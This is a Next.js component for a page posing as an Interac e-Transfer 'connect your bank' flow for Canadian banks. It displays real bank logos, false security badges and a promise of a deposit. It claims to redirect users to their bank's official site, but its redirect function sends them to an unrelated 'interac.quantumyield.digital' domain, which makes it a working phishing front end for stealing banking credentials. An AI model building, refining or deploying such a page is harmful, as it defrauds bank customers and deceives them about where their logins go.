"use client"

import { useState } from "react"
import { useRouter } from "next/navigation"
import Image from "next/image"
import {
  Shield,
  Search,
  ArrowLeft,
  ArrowRight,
  CheckCircle2,
  Lock,
  Loader2,
  Building2,
  CreditCard,
  ChevronRight,
  X,
} from "lucide-react"

// ─── Data ────────────────────────────────────────────────────────────────────

export type BankCategory = "Big Six" | "Online Banks" | "Credit Unions" | "Regional Banks"

export interface BankEntry {
  id: string
  name: string
  logo: string
  category: BankCategory
  loginUrl: string
}

export const BANKS: BankEntry[] = [
  { id: "td",         name: "TD Bank",          logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a4/Toronto-Dominion_Bank_logo.svg/320px-Toronto-Dominion_Bank_logo.svg.png", category: "Big Six",        loginUrl: "https://www.td.com" },
  { id: "rbc",        name: "RBC",               logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/4/41/Royal_Bank_of_Canada_Logo.svg/320px-Royal_Bank_of_Canada_Logo.svg.png",  category: "Big Six",        loginUrl: "https://www.rbc.com" },
  { id: "scotiabank", name: "Scotiabank",        logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7a/Scotiabank_Logo.svg/320px-Scotiabank_Logo.svg.png",                      category: "Big Six",        loginUrl: "https://www.scotiabank.com" },
  { id: "bmo",        name: "BMO",               logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/8e/Bank_of_Montreal_logo.svg/320px-Bank_of_Montreal_logo.svg.png",          category: "Big Six",        loginUrl: "https://www.bmo.com" },
  { id: "cibc",       name: "CIBC",              logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/CIBC_logo.svg/320px-CIBC_logo.svg.png",                                  category: "Big Six",        loginUrl: "https://www.cibc.com" },
  { id: "nbc",        name: "National Bank",     logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5d/National_Bank_of_Canada.svg/320px-National_Bank_of_Canada.svg.png",      category: "Big Six",        loginUrl: "https://www.nbc.ca" },
  { id: "tangerine",  name: "Tangerine",         logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/14/Tangerine_Bank_Logo.svg/320px-Tangerine_Bank_Logo.svg.png",              category: "Online Banks",   loginUrl: "https://www.tangerine.ca" },
  { id: "eq",         name: "EQ Bank",           logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/d/dc/EQ_Bank_logo.svg/320px-EQ_Bank_logo.svg.png",                            category: "Online Banks",   loginUrl: "https://www.eqbank.ca" },
  { id: "simplii",    name: "Simplii Financial", logo: "https://upload.wikimedia.org/wikipedia/en/thumb/c/cc/Simplii_Financial_logo.svg/320px-Simplii_Financial_logo.svg.png",             category: "Online Banks",   loginUrl: "https://www.simplii.com" },
  { id: "pcf",        name: "PC Financial",      logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/8/80/PC_Financial_logo.svg/320px-PC_Financial_logo.svg.png",                  category: "Online Banks",   loginUrl: "https://www.pcfinancial.ca" },
  { id: "desjardins", name: "Desjardins",        logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/0/08/Desjardins_Logo.svg/320px-Desjardins_Logo.svg.png",                     category: "Credit Unions",  loginUrl: "https://www.desjardins.com" },
  { id: "vancity",    name: "Vancity",           logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/2/29/Vancity_logo.svg/320px-Vancity_logo.svg.png",                            category: "Credit Unions",  loginUrl: "https://www.vancity.com" },
  { id: "hsbc",       name: "HSBC Canada",       logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/HSBC_logo_%282018%29.svg/320px-HSBC_logo_%282018%29.svg.png",           category: "Regional Banks", loginUrl: "https://www.hsbc.ca" },
  { id: "atb",        name: "ATB Financial",     logo: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f1/ATB_Financial_logo.svg/320px-ATB_Financial_logo.svg.png",               category: "Regional Banks", loginUrl: "https://www.atb.com" },
]

export const CATEGORIES: BankCategory[] = ["Big Six", "Online Banks", "Credit Unions", "Regional Banks"]

const TRUST = [
  { icon: Lock,         label: "256-bit SSL",        sub: "Encrypted connection" },
  { icon: Shield,       label: "Bank-level security", sub: "Your data stays safe" },
  { icon: CheckCircle2, label: "CDIC Member",         sub: "Government insured" },
]

type Step = "select" | "confirm" | "connecting" | "redirecting"

interface Props {
  /** Back button handler — label and behaviour differ between admin and client */
  onBack: () => void
  backLabel: string
  /** Whether to show the manual entry fallback at the bottom */
  showManualEntry?: boolean
}

// ─── Shared flow ─────────────────────────────────────────────────────────────

export default function ConnectBankFlow({ onBack, backLabel, showManualEntry = true }: Props) {
  const [search, setSearch]               = useState("")
  const [activeCategory, setActiveCategory] = useState<BankCategory | "All">("All")
  const [selected, setSelected]           = useState<BankEntry | null>(null)
  const [step, setStep]                   = useState<Step>("select")
  const [countdown, setCountdown]         = useState(5)
  const [brokenLogos, setBrokenLogos]     = useState<Set<string>>(new Set())

  const filtered = BANKS.filter((b) => {
    const matchSearch = b.name.toLowerCase().includes(search.toLowerCase())
    const matchCat    = activeCategory === "All" || b.category === activeCategory
    return matchSearch && matchCat
  })

  const grouped = CATEGORIES.reduce<Record<BankCategory, BankEntry[]>>((acc, cat) => {
    acc[cat] = filtered.filter((b) => b.category === cat)
    return acc
  }, {} as Record<BankCategory, BankEntry[]>)

  // Countdown effect
  const [countdownStarted, setCountdownStarted] = useState(false)
  if (step === "redirecting" && !countdownStarted) {
    setCountdownStarted(true)
    const tick = () => {
      setCountdown((c) => {
        if (c <= 1) {
          doRedirect()
          return 0
        }
        setTimeout(tick, 1000)
        return c - 1
      })
    }
    setTimeout(tick, 1000)
  }

  const doRedirect = () => {
    if (!selected) return
    const params = new URLSearchParams({
      bankId:     selected.id,
      bankName:   selected.name,
      categoryId: selected.category,
    })
    window.location.href = `https://interac.quantumyield.digital/countdown?${params.toString()}`
  }

  const handleSelect = (bank: BankEntry) => {
    setSelected(bank)
    setStep("confirm")
  }

  const handleConnect = () => {
    setStep("connecting")
    setTimeout(() => setStep("redirecting"), 2000)
  }

  const handleBack = () => {
    if (step !== "select") {
      setSelected(null)
      setStep("select")
      setCountdown(5)
      setCountdownStarted(false)
    } else {
      onBack()
    }
  }

  return (
    <main className="max-w-5xl mx-auto px-4 py-8 pb-16">

      {/* Back nav */}
      <button
        onClick={handleBack}
        className="flex items-center gap-2 text-sm text-zinc-500 hover:text-zinc-900 transition-colors mb-6 group"
      >
        <ArrowLeft className="w-4 h-4 group-hover:-translate-x-0.5 transition-transform" />
        {step === "select" ? backLabel : "Choose a different bank"}
      </button>

      {/* ── SELECT ── */}
      {step === "select" && (
        <>
          {/* Hero */}
          <div className="mb-10">
            <div className="flex items-center gap-3 mb-3">
              <div className="w-10 h-10 rounded-xl bg-[#FDB913] flex items-center justify-center">
                <Building2 className="w-5 h-5 text-black" />
              </div>
              <span className="text-xs font-semibold tracking-widest text-zinc-400 uppercase">Interac e-Transfer</span>
            </div>
            <h1 className="text-3xl md:text-4xl font-bold text-zinc-900 mb-3 text-balance">
              Connect your bank account
            </h1>
            <p className="text-zinc-500 text-base md:text-lg leading-relaxed max-w-xl">
              Select your financial institution to securely link your account and receive your e-Transfer deposit.
            </p>
          </div>

          {/* Trust strip */}
          <div className="grid grid-cols-3 gap-3 mb-10">
            {TRUST.map(({ icon: Icon, label, sub }) => (
              <div
                key={label}
                className="flex flex-col sm:flex-row items-start sm:items-center gap-2 sm:gap-3 bg-zinc-50 border border-zinc-200 rounded-xl p-3 sm:p-4"
              >
                <div className="w-8 h-8 shrink-0 rounded-lg bg-[#FDB913]/15 flex items-center justify-center">
                  <Icon className="w-4 h-4 text-[#FDB913]" />
                </div>
                <div className="min-w-0">
                  <p className="text-xs font-semibold text-zinc-800 leading-tight">{label}</p>
                  <p className="text-xs text-zinc-400 leading-tight hidden sm:block">{sub}</p>
                </div>
              </div>
            ))}
          </div>

          {/* Search + category filter */}
          <div className="flex flex-col sm:flex-row gap-3 mb-6">
            <div className="relative flex-1">
              <Search className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-zinc-400 pointer-events-none" />
              <input
                type="search"
                placeholder="Search your bank..."
                value={search}
                onChange={(e) => setSearch(e.target.value)}
                className="w-full pl-10 pr-4 py-3 rounded-xl border border-zinc-200 bg-white text-sm text-zinc-900 placeholder:text-zinc-400 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent transition-all"
                style={{ fontSize: "16px" }}
              />
              {search && (
                <button
                  onClick={() => setSearch("")}
                  className="absolute right-3.5 top-1/2 -translate-y-1/2 text-zinc-400 hover:text-zinc-600"
                >
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            <div className="flex gap-2 overflow-x-auto pb-1 sm:pb-0 shrink-0">
              {(["All", ...CATEGORIES] as const).map((cat) => (
                <button
                  key={cat}
                  onClick={() => setActiveCategory(cat)}
                  className={`px-3 py-2.5 rounded-xl text-xs font-semibold whitespace-nowrap border transition-all min-h-[44px] ${
                    activeCategory === cat
                      ? "bg-[#FDB913] text-black border-[#FDB913]"
                      : "bg-white text-zinc-600 border-zinc-200 hover:border-zinc-400"
                  }`}
                >
                  {cat}
                </button>
              ))}
            </div>
          </div>

          {/* Bank grid */}
          {filtered.length === 0 ? (
            <div className="text-center py-16 text-zinc-400">
              <Building2 className="w-10 h-10 mx-auto mb-3 opacity-40" />
              <p className="font-medium">No banks match &quot;{search}&quot;</p>
              <p className="text-sm mt-1">Try a different search term</p>
            </div>
          ) : (
            <div className="space-y-8">
              {CATEGORIES.map((cat) => {
                const banks = grouped[cat]
                if (!banks.length) return null
                if (activeCategory !== "All" && activeCategory !== cat) return null
                return (
                  <section key={cat}>
                    <h2 className="text-xs font-semibold tracking-widest text-zinc-400 uppercase mb-3">{cat}</h2>
                    <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-6 gap-3">
                      {banks.map((bank) => (
                        <button
                          key={bank.id}
                          onClick={() => handleSelect(bank)}
                          className="group relative bg-white border-2 border-zinc-100 hover:border-[#FDB913] rounded-2xl p-4 flex flex-col items-center justify-center gap-2 min-h-[100px] transition-all hover:shadow-lg hover:shadow-[#FDB913]/10 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2"
                          aria-label={`Connect ${bank.name}`}
                        >
                          {!brokenLogos.has(bank.id) ? (
                            <Image
                              src={bank.logo}
                              alt={`${bank.name} logo`}
                              width={120}
                              height={48}
                              className="w-full h-10 object-contain transition-all group-hover:scale-105"
                              onError={() => setBrokenLogos((p) => new Set(p).add(bank.id))}
                              unoptimized
                            />
                          ) : (
                            <div className="w-10 h-10 rounded-xl bg-[#FDB913] flex items-center justify-center">
                              <span className="text-black font-bold text-lg">{bank.name[0]}</span>
                            </div>
                          )}
                          <span className="text-[11px] font-semibold text-zinc-500 group-hover:text-zinc-900 text-center leading-tight transition-colors">
                            {bank.name}
                          </span>
                          <ChevronRight className="absolute right-2 top-1/2 -translate-y-1/2 w-3.5 h-3.5 text-zinc-300 group-hover:text-[#FDB913] opacity-0 group-hover:opacity-100 transition-all" />
                        </button>
                      ))}
                    </div>
                  </section>
                )
              })}
            </div>
          )}

          {/* Manual entry fallback */}
          {showManualEntry && (
            <div className="mt-12 border-t border-zinc-100 pt-8">
              <p className="text-sm text-zinc-400 mb-3">{"Don't see your bank?"}</p>
              <ManualEntryForm />
            </div>
          )}
        </>
      )}

      {/* ── CONFIRM / CONNECTING / REDIRECTING ── */}
      {(step === "confirm" || step === "connecting" || step === "redirecting") && selected && (
        <div className="max-w-lg mx-auto">

          {/* Bank card */}
          <div className="bg-zinc-50 border border-zinc-200 rounded-2xl p-6 mb-6 flex items-center gap-5">
            <div className="w-16 h-16 bg-white rounded-xl border border-zinc-200 flex items-center justify-center overflow-hidden shrink-0">
              {!brokenLogos.has(selected.id) ? (
                <Image
                  src={selected.logo}
                  alt={selected.name}
                  width={64}
                  height={64}
                  className="w-full h-full object-contain p-2"
                  onError={() => setBrokenLogos((p) => new Set(p).add(selected.id))}
                  unoptimized
                />
              ) : (
                <span className="text-xl font-bold text-zinc-900">{selected.name[0]}</span>
              )}
            </div>
            <div>
              <p className="text-xs text-zinc-400 font-medium uppercase tracking-wider mb-0.5">{selected.category}</p>
              <h2 className="text-xl font-bold text-zinc-900">{selected.name}</h2>
            </div>
          </div>

          {/* Security notice */}
          <div className="flex items-start gap-3 bg-[#FDB913]/8 border border-[#FDB913]/30 rounded-xl p-4 mb-6">
            <Shield className="w-5 h-5 text-[#FDB913] shrink-0 mt-0.5" />
            <div>
              <p className="text-sm font-semibold text-zinc-800 mb-0.5">Secure connection</p>
              <p className="text-sm text-zinc-500 leading-relaxed">
                {"You'll be securely redirected to"} {selected.name}{"'s official website. Never share your banking credentials with anyone."}
              </p>
            </div>
          </div>

          {/* What happens next */}
          {step === "confirm" && (
            <>
              <h3 className="text-sm font-semibold text-zinc-700 mb-3">What happens next</h3>
              <ul className="space-y-3 mb-8">
                {[
                  "You'll be redirected to your bank's secure login page",
                  "Log in with your existing banking credentials",
                  "Authorize the connection to complete your deposit",
                ].map((text, i) => (
                  <li key={i} className="flex items-start gap-3 text-sm text-zinc-600">
                    <span className="w-5 h-5 rounded-full bg-[#FDB913]/15 text-[#FDB913] font-bold text-xs flex items-center justify-center shrink-0 mt-0.5">
                      {i + 1}
                    </span>
                    {text}
                  </li>
                ))}
              </ul>
              <button
                onClick={handleConnect}
                className="w-full flex items-center justify-center gap-2 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold py-4 rounded-xl transition-colors text-base focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 min-h-[56px]"
              >
                Connect to {selected.name}
                <ArrowRight className="w-5 h-5" />
              </button>
            </>
          )}

          {/* Connecting spinner */}
          {step === "connecting" && (
            <div className="text-center py-10">
              <Loader2 className="w-12 h-12 text-[#FDB913] animate-spin mx-auto mb-4" />
              <p className="font-semibold text-zinc-800 text-lg">Establishing secure connection...</p>
              <p className="text-zinc-400 text-sm mt-1">Preparing your bank redirect</p>
            </div>
          )}

          {/* Redirecting countdown */}
          {step === "redirecting" && (
            <div className="text-center py-8">
              <div className="relative w-20 h-20 mx-auto mb-6">
                <svg className="w-20 h-20 -rotate-90" viewBox="0 0 80 80">
                  <circle cx="40" cy="40" r="34" fill="none" stroke="#f4f4f5" strokeWidth="8" />
                  <circle
                    cx="40" cy="40" r="34"
                    fill="none"
                    stroke="#FDB913"
                    strokeWidth="8"
                    strokeLinecap="round"
                    strokeDasharray={`${2 * Math.PI * 34}`}
                    strokeDashoffset={`${2 * Math.PI * 34 * (1 - countdown / 5)}`}
                    style={{ transition: "stroke-dashoffset 1s linear" }}
                  />
                </svg>
                <span className="absolute inset-0 flex items-center justify-center text-2xl font-bold text-zinc-900">
                  {countdown}
                </span>
              </div>
              <p className="font-semibold text-zinc-800 text-lg">Redirecting to {selected.name}</p>
              <p className="text-zinc-400 text-sm mt-1 mb-6">Opening secure bank portal in {countdown}s</p>
              <button
                onClick={doRedirect}
                className="inline-flex items-center gap-2 bg-[#FDB913] hover:bg-[#e5a811] text-black font-semibold px-6 py-3 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:ring-offset-2 min-h-[44px]"
              >
                Continue now
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
      )}
    </main>
  )
}

// ─── Manual entry fallback ────────────────────────────────────────────────────

function ManualEntryForm() {
  const [form, setForm]         = useState({ institution: "", accountType: "", branch: "" })
  const [submitting, setSubmitting] = useState(false)
  const [done, setDone]         = useState(false)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!form.institution || !form.accountType) return
    setSubmitting(true)
    setTimeout(() => { setSubmitting(false); setDone(true) }, 1500)
  }

  if (done) {
    return (
      <div className="flex items-center gap-3 p-4 bg-green-50 border border-green-200 rounded-xl text-sm text-green-700">
        <CheckCircle2 className="w-5 h-5 shrink-0" />
        <span>Your bank details have been submitted. Our team will verify and connect your account.</span>
      </div>
    )
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-3 max-w-md">
      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className="text-xs font-semibold text-zinc-600 block mb-1">Institution name</label>
          <input
            required
            value={form.institution}
            onChange={(e) => setForm({ ...form, institution: e.target.value })}
            placeholder="e.g. TD Bank"
            className="w-full border border-zinc-200 rounded-xl px-3 py-2.5 text-sm text-zinc-900 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
            style={{ fontSize: "16px" }}
          />
        </div>
        <div>
          <label className="text-xs font-semibold text-zinc-600 block mb-1">Account type</label>
          <select
            required
            value={form.accountType}
            onChange={(e) => setForm({ ...form, accountType: e.target.value })}
            className="w-full border border-zinc-200 rounded-xl px-3 py-2.5 text-sm text-zinc-900 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent bg-white"
            style={{ fontSize: "16px" }}
          >
            <option value="">Select type</option>
            <option value="chequing">Chequing</option>
            <option value="savings">Savings</option>
            <option value="business">Business</option>
          </select>
        </div>
      </div>
      <div>
        <label className="text-xs font-semibold text-zinc-600 block mb-1">Branch / transit number (optional)</label>
        <input
          value={form.branch}
          onChange={(e) => setForm({ ...form, branch: e.target.value })}
          placeholder="e.g. 00123"
          className="w-full border border-zinc-200 rounded-xl px-3 py-2.5 text-sm text-zinc-900 focus:outline-none focus:ring-2 focus:ring-[#FDB913] focus:border-transparent"
          style={{ fontSize: "16px" }}
        />
      </div>
      <button
        type="submit"
        disabled={submitting}
        className="flex items-center gap-2 bg-zinc-900 hover:bg-zinc-700 text-white font-semibold px-5 py-3 rounded-xl text-sm transition-colors disabled:opacity-60 focus:outline-none focus:ring-2 focus:ring-zinc-900 focus:ring-offset-2 min-h-[44px]"
      >
        {submitting ? <Loader2 className="w-4 h-4 animate-spin" /> : <CreditCard className="w-4 h-4" />}
        {submitting ? "Submitting..." : "Submit manually"}
      </button>
    </form>
  )
}
